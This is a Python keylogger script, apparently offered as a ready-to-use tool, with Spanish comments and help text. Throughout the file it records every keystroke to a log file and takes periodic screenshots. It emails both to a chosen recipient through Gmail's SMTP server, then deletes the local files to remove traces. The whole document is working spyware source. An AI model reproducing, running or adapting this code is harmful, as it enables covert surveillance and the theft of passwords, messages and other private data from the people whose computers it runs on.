import os
import smtplib
import time
from pynput.keyboard import Listener
from threading import Thread
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from PIL import ImageGrab  # Para capturar pantallazos
import argparse

# Configurar argparse con un formato más ordenado
parser = argparse.ArgumentParser(
    description=(
        "Keylogger007 que registra las teclas presionadas, captura pantallazos y envía los datos por correo electrónico.\n\n"
        "PARÁMETROS:\n"
        "  - EMAIL_ADDRESS: Es tu dirección de correo electrónico desde la cual se enviarán los datos.\n"
        "    Ejemplo: tu_email@gmail.com\n\n"
        "  - EMAIL_PASSWORD: Es la contraseña de tu correo electrónico.\n"
        "    NOTA!: Si usas Gmail, es posible que necesites generar una 'Contraseña de Aplicación'.\n"
        "  - RECIPIENT_EMAIL: Es la dirección de correo electrónico del destinatario que recibirá los datos.\n"
        "  - TIME: Tiempo de ejecución del keylogger en segundos.\n"
        "  - SCREENSHOT_INTERVAL: Intervalo en segundos para capturar pantallazos.\n"
    ),
    formatter_class=argparse.RawTextHelpFormatter
)

parser.add_argument("--email", required=False, help="Dirección de correo electrónico desde la cual se enviarán los datos.")
parser.add_argument("--password", required=False, help="Contraseña del correo electrónico (o contraseña de aplicación si usas Gmail).")
parser.add_argument("--recipient", required=False, help="Dirección de correo electrónico del destinatario que recibirá los datos.")
parser.add_argument("--time", type=int, required=False, help="Tiempo de ejecución del keylogger en segundos.")
parser.add_argument("--screenshot_interval", type=int, required=False, help="Intervalo en segundos para capturar pantallazos.")

# Parsear los argumentos
args = parser.parse_args()

# Validar argumentos
if not (args.email and args.password and args.recipient and args.time and args.screenshot_interval):
    print("\nEjecuta el script con los argumentos necesarios o usa --help para más información.\n")
    exit()

# Asignar las variables desde argparse
EMAIL_ADDRESS = args.email
EMAIL_PASSWORD = args.password
RECIPIENT_EMAIL = args.recipient
tiempo_ejecucion = args.time
screenshot_interval = args.screenshot_interval
file_path = "keylog.txt"
screenshot_dir = "screenshots"

# Crear el directorio para guardar pantallazos
if not os.path.exists(screenshot_dir):
    os.makedirs(screenshot_dir)

# Crear el archivo de teclas vacío si no existe
if not os.path.exists(file_path):
    with open(file_path, "w") as f:
        pass  # Crear un archivo vacío

# Variables globales
ejecucion_activa = True

# Función que se ejecuta cada vez que se presiona una tecla
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            with open(file_path, "a") as f:
                f.write(key.char)
        elif key == key.space:
            with open(file_path, "a") as f:
                f.write(" ")
    except Exception as e:
        print(f"Error al registrar la tecla: {e}")

# Función para capturar pantallazos
def capturar_pantallazo():
    while ejecucion_activa:
        try:
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            screenshot_path = os.path.join(screenshot_dir, f"screenshot_{timestamp}.png")
            ImageGrab.grab().save(screenshot_path, "PNG")
            time.sleep(screenshot_interval)
        except Exception as e:
            print(f"Error al capturar el pantallazo: {e}")

# Función para enviar el archivo y los pantallazos por correo
def enviar_correo():
    mensaje = MIMEMultipart()
    mensaje['From'] = EMAIL_ADDRESS
    mensaje['To'] = RECIPIENT_EMAIL
    mensaje['Subject'] = "Archivos Keylogger"

    # Adjuntar el archivo de teclas
    try:
        if os.path.getsize(file_path) > 0:  # Verificar si el archivo no está vacío
            with open(file_path, "rb") as archivo:
                parte = MIMEBase("application", "octet-stream")
                parte.set_payload(archivo.read())
                encoders.encode_base64(parte)
                parte.add_header("Content-Disposition", f"attachment; filename={file_path}")
                mensaje.attach(parte)
        else:
            print("El archivo de teclas está vacío. No se adjuntará.")
    except FileNotFoundError:
        print("Error: El archivo de teclas no se encontró.")
    except Exception as e:
        print(f"Error al adjuntar el archivo de teclas: {e}")

    # Adjuntar los pantallazos
    try:
        for screenshot in os.listdir(screenshot_dir):
            screenshot_path = os.path.join(screenshot_dir, screenshot)
            with open(screenshot_path, "rb") as archivo:
                parte = MIMEBase("application", "octet-stream")
                parte.set_payload(archivo.read())
                encoders.encode_base64(parte)
                parte.add_header("Content-Disposition", f"attachment; filename={screenshot}")
                mensaje.attach(parte)
    except Exception as e:
        print(f"Error al adjuntar los pantallazos: {e}")

    # Enviar el correo
    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as servidor:
            servidor.starttls()
            servidor.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            servidor.sendmail(EMAIL_ADDRESS, RECIPIENT_EMAIL, mensaje.as_string())
            print("Correo enviado exitosamente.")
    except smtplib.SMTPAuthenticationError:
        print("Error: La autenticación falló. Verifica tu dirección y contraseña de correo.")
    except Exception as e:
        print(f"Error al enviar el correo: {e}")

# Función para finalizar el keylogger, enviar los archivos y borrarlos
def finalizar():
    global ejecucion_activa
    ejecucion_activa = False  # Detener la captura de pantallazos
    listener.stop()
    enviar_correo()
    if os.path.exists(file_path):
        os.remove(file_path)
    for screenshot in os.listdir(screenshot_dir):
        os.remove(os.path.join(screenshot_dir, screenshot))
    os.rmdir(screenshot_dir)
    print("Archivos eliminados.")

# Configurar el listener
listener = Listener(on_press=on_press)
listener.start()

# Iniciar la captura de pantallazos en un hilo separado
hilo_pantallazos = Thread(target=capturar_pantallazo)
hilo_pantallazos.start()

# Mostrar un contador de tiempo restante
try:
    for i in range(tiempo_ejecucion, 0, -1):
        print(f"Tiempo ejecución restante: {i} segundos", end="\r")
        time.sleep(1)
    finalizar()
except KeyboardInterrupt:
    print("\nInterrupción detectada. Finalizando...")
    finalizar()

# Esperar a que el hilo de pantallazos termine
hilo_pantallazos.join()
